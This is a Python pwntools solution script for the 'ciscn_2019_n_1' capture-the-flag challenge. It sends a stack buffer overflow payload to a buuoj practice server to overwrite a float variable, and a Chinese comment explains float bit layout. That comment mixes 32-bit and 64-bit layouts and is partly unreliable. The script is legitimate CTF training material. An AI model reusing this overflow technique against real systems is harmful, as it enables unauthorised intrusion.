from pwn import *

'''
    浮点数存储方式：
    (-1)^S * M * 2^E
    (-1)^S表示符号位，当S=0，V为正数；当s=1，V为负数。
        M表示有效数字，大于等于1，小于2。
        2^E表示指数位。
        ————————————————————————————————————————————————————————————————————————————————
        | S符号位（1bit）  |    E指数位（8bit）       |      M有效数字位（23bit）              |
        ————————————————————————————————————————————————————————————————————————————————
        |                |                        |                                     |
        ————————————————————————————————————————————————————————————————————————————————
    
    x64位下，float 11.28125 转bit
        十六进制表示为0x4134800000000000
        二进制为：0；10000010；0110100100000000000000000000000000000000000000000000000   
'''


def ciscn_2019_n_1(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_n_1'):
    print('ciscn_2019_n_1 start')
    target = remote('node4.buuoj.cn', 28032)
    # target = process([file_name])

    payload = b'A' * 40 + p64(0x4134800000000000)
    # gdb.attach(target)
    target.sendline(payload)
    print(target.recv())
    print('ciscn_2019_n_1 end')


if __name__ == '__main__':
    ciscn_2019_n_1()
